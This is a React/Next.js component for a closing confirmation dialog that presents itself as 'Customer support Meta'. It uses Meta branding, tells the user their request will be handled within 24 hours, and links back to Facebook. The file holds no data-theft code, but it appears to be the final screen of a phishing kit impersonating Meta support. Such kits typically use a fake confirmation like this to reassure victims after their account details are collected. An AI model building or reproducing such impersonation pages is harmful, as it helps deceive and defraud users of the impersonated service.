"use client";
import FinalImage from '@/assets/images/final-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { type FC } from 'react';

const FinalModal: FC = () => {
    const { setModalOpen, translations: storeTranslations } = store();
    
    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };

    return (
        <div className='fixed inset-0 z-[10000] flex items-center justify-center bg-black/40 animate-fade-in'>
            <div 
                className='max-h-[95vh] h-auto w-full max-w-[560px] mx-2 md:mx-0 shadow-2xl rounded-[20px] flex flex-col overflow-hidden animate-slide-up relative bg-white'
                style={{ backgroundColor: '#ffffff' }}
            >
                {/* Gradient overlay */}
                <div 
                    className='absolute inset-0 pointer-events-none'
                    style={{ background: 'linear-gradient(135deg, rgba(255,245,255,0.7) 0%, rgba(240,255,249,0.7) 100%)' }}
                />

                <div className='relative z-10 flex flex-col h-full'>
                    <div className='px-[24px] pt-[14px] pb-[4px] flex items-center justify-between relative'>
                        <div className='flex-1 text-center'>
                            <h2 className='font-bold text-[#0A1317] text-[17px] leading-[1.5]'>{t('Request has been sent')}</h2>
                        </div>
                        <button
                            type='button'
                            onClick={() => setModalOpen(false)}
                            className='absolute right-[24px] top-[16px] text-gray-400 hover:text-black transition-all'
                            aria-label='Close modal'
                        >
                            <FontAwesomeIcon icon={faXmark} className='text-[18px]' />
                        </button>
                    </div>
                    
                    <div className='flex-1 overflow-y-auto px-[22px] pt-[12px] pb-[24px]'>
                        <div className='h-full flex flex-col flex-start w-full items-center justify-between flex-1'>
                            <div className='w-full'>
                                <div className='rounded-[10px] overflow-hidden mb-[15px]'>
                                    <Image src={FinalImage} alt='' className='w-full h-auto' />
                                </div>
                                <p className='text-[#9a979e] mb-[10px] text-[15px]'>
                                    {t('Your request has been added to the processing queue')}. {t('We will handle your request within 24 hours')}. {t('in case we do not receive feedback')}, {t('please send back information so we can assist you')}.
                                </p>
                                <p className='text-[#9a979e] mb-[20px] text-[15px]'>
                                    {t('From the Customer support Meta')}.
                                </p>
                                <a
                                    href='https://www.facebook.com'
                                    className='w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-[16px] rounded-full pt-[10px] pb-[10px] flex items-center justify-center transition-all duration-300 h-[46px] min-h-[46px] shadow-lg active:scale-[0.98]'
                                >
                                    {t('Return to Facebook')}
                                </a>
                            </div>
                            <div className='w-[65px] mt-[20px] mx-auto opacity-60'>
                                <Image src={MetaLogo} alt='' width={65} height={18} className='w-full h-full' />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default FinalModal;
